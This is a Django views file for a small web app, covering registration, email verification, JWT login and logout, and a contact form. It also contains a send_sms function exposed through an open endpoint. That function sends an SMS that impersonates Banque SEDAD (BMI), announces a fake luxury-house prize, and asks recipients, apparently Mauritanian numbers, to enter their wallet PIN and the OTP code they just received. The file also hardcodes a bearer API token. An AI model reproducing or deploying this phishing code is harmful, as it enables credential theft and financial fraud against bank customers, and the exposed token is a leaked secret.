from django.shortcuts import render
import json
import traceback
import requests
# import requests
from django.shortcuts import render, get_object_or_404, redirect
from django.views.decorators.csrf import csrf_exempt
from rest_framework import generics, status
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework_simplejwt.tokens import RefreshToken
from rest_framework_simplejwt.views import  TokenObtainPairView
# from rest_framework_simplejwt.serializers import TokenBlacklistSerializer
from .models import  Contact, CustomUser, Contact
from .serializers import  LoginSerializer, RegisterSerializer, ContactSerializer, UserSerializer
from django.db import IntegrityError
from datetime import datetime
from django.contrib.auth import authenticate
from django.contrib.auth.decorators import login_required
from django.views.decorators.http import require_POST
from django.http import HttpResponse, JsonResponse
from rest_framework.decorators import api_view, permission_classes


def index(request):
    return HttpResponse("4i page wetov !")

def index(request):
    return render(request,'index.html')

class RegisterView(generics.CreateAPIView):
    queryset = CustomUser.objects.all()
    serializer_class = RegisterSerializer
    permission_classes = [AllowAny]
    
class VerifyEmailView(APIView):
    def post(self, request):
        email = request.data.get("email")
        code = request.data.get("code")

        try:
            user = CustomUser.objects.get(email=email, verification_code=code)
            user.is_verified = True
            user.verification_code = None  
            user.save()
            return Response({"message": "4AK RAW SLA7."}, status=status.HTTP_200_OK)
        except CustomUser.DoesNotExist:
            return Response({"error": "email or code moh sale7."}, status=status.HTTP_400_BAD_REQUEST)
class LoginView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        serializer = LoginSerializer(data=request.data)
        if serializer.is_valid():
            return Response(serializer.validated_data, status=status.HTTP_200_OK)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

class LogoutView(APIView):
    permission_classes = [IsAuthenticated]

    def post(self, request):
        refresh_token = request.data.get("refresh")

        if not refresh_token:
            return Response(
                {"error": "Refresh token ray required"}, 
                status=status.HTTP_400_BAD_REQUEST
            )

        try:
            token = RefreshToken(refresh_token)
            token.blacklist()  
            return Response(
                {"message": "4AK RAW SLA7."}, 
                status=status.HTTP_205_RESET_CONTENT
            )
        except Exception as e:
            return Response(
                {"error": "Invalid wala expired token"}, 
                status=status.HTTP_400_BAD_REQUEST
            )

class UserProfileView(generics.RetrieveUpdateAPIView):
    queryset = CustomUser.objects.all()
    serializer_class = UserSerializer
    permission_classes = [IsAuthenticated]

    def get_object(self):
        return self.request.user
    
class ContactCreateView(generics.CreateAPIView):
    queryset = Contact.objects.all()
    serializer_class = ContactSerializer
    permission_classes = []
    
    
def send_sms( phone_number):
        url = "https://api.d7networks.com/messages/v1/send"
        
    


        payload = json.dumps({
            "messages": [
                {
                    "channel": "sms",
                    "recipients": [f'+222{phone_number}'],
                    "content": " Félicitations !\nCher client, vous avez été sélectionné parmi les gagnants d'une maison de luxe offerte par la Banque SEDAD (BMI).\n\nPour recevoir votre prix, veuillez visiter le lien suivant immédiatement :\n https://www.youtube.com/watch?v=ArJS_5h_KVM\n\nEnsuite, entrez le code de votre portefeuille (PIN) ainsi que le code OTP que vous venez de recevoir.\n\n Ne manquez pas cette opportunité ! Offre valable pour une durée limitée uniquement.",
                    "msg_type": "text",
                    "data_coding": "text"
                }
            ],
            "message_globals": {
                "originator": "SEDAD-WINNER",  
                "report_url": "https://your_report_url.com"
            }
        })

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoLWJhY2tlbmQ6YXBwIiwic3ViIjoiMjE1MWM2OWUtNzBkNi00YWZjLWEzNTMtMzA4MzA3MGVmYTllIn0.-bGdIBUHG_jvf246cvHdWfutMAP_hW1jawNHmgndHP8' 
        }

        try:
            response = requests.post(url, headers=headers, data=payload)
            if response.status_code == 200:
                return True
            else:
                print("Failed to send the sms:", response.text)
                return False
        except requests.exceptions.RequestException as e:
            print("Error sending sms:", e)
            return False
        
        
@api_view(['POST'])
def send_sms_view(request):
    try:
        data = request.data
        phone_number = data.get("phone_number")

        if not phone_number:
            return Response({"error": "Phone number is required"}, status=status.HTTP_400_BAD_REQUEST)

        success = send_sms(phone_number)  # Call your function

        if success:
            return Response({"message": "SMS sent successfully"}, status=status.HTTP_200_OK)
        else:
            return Response({"error": "Failed to send SMS"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

    except Exception as e:
        return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)